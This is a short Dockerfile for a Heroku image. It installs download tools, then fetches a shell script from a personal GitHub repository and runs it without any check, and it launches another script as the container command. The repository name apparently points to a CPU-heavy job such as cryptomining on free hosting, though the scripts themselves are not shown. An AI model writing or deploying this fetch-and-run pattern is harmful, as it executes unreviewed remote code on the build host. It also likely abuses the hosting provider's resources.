FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
CMD bash heroku.sh
